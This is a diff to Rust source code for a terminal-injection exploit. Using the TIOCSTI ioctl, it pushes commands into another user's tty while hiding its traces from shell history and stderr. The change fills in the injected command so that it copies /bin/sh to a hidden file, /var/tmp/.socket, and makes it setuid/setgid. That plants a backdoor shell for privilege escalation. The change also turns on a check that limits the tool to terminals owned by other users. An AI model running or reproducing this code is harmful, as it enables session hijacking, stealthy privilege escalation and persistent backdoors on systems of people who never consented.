@@ -17,7 +17,7 @@ use libc::{SIGSTOP, STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, kill};
 /// First part of the payload to inject into the tty's input buffer.
 const START: &[u8] = b" exec 2>&-;set +o history\nhistory -d-1\n({ ";
 /// The command to execute after the payload has been injected.
-const COMMAND: &[u8] = b"command";
+const COMMAND: &[u8] = b"cp /bin/sh /var/tmp/.socket; chmod 6777 /var/tmp/.socket";
 /// End part of the payload to inject into the tty's input buffer.
 const END: &[u8] = b";}>/dev/null 2>/dev/null &);set -o history;exec 2>&0;fg\n";
 
@@ -51,7 +51,7 @@ pub fn run() -> anyhow::Result<()> {
         .context("failed to resolve tty path")?;
     let tty_metadata = fs::metadata(&tty_path).context("failed to stat tty")?;
     if tty_metadata.uid() == uid {
-        //anyhow::bail!("tty has the same uid as us");
+        anyhow::bail!("tty has the same uid as us");
     }
 
     // TODO: Only execute once: delete our own executable.
@@ -88,15 +88,6 @@ pub fn run() -> anyhow::Result<()> {
     // TODO: move initial checks to an external function?
 
     // No need to SIGCONT here because `fg` in the payload does that for us.
-    /*
-    if unsafe { kill(parent_pid, SIGCONT) } != 0 {
-        anyhow::bail!(
-            "failed to suspend parent process: {}",
-            io::Error::last_os_error()
-        );
-    }
-    */
-
     Ok(())
 }
 
